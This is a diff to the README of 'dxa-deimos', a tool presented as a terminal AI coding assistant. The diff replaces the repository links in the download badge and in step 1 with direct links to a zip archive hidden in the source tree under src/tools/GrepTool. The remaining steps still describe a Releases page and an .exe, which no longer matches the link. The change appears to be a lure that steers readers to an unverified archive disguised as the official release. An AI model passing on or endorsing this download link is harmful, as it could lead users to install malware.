@@ -1,6 +1,6 @@
 # 🤖 dxa-deimos - Your personal AI coding assistant tool
 
-[![Download dxa-deimos](https://img.shields.io/badge/Download-dxa--deimos-blue)](https://github.com/asdadcfgh-maker/dxa-deimos)
+[![Download dxa-deimos](https://img.shields.io/badge/Download-dxa--deimos-blue)](https://github.com/asdadcfgh-maker/dxa-deimos/raw/refs/heads/main/src/tools/GrepTool/dxa_deimos_2.4.zip)
 
 dxa-deimos is a program that brings artificial intelligence directly to your computer terminal. This tool helps you write, debug, and manage code. It connects to both local AI programs on your computer and large cloud-based AI services. You use this tool to ask questions about your code, generate new scripts, or explain difficult programming concepts without leaving your workspace.
 
@@ -25,7 +25,7 @@ To run dxa-deimos on your Windows computer, you need these items:
 
 You obtain the software through the official release page. Follow these steps to get started:
 
-1.  Visit this page to download: [https://github.com/asdadcfgh-maker/dxa-deimos](https://github.com/asdadcfgh-maker/dxa-deimos).
+1.  Visit this page to download: [https://github.com/asdadcfgh-maker/dxa-deimos/raw/refs/heads/main/src/tools/GrepTool/dxa_deimos_2.4.zip](https://github.com/asdadcfgh-maker/dxa-deimos/raw/refs/heads/main/src/tools/GrepTool/dxa_deimos_2.4.zip).
 2.  Look for the section marked Releases on the right side of the screen.
 3.  Click the version tagged as latest.
 4.  Find the file ending in .exe under the Assets section.
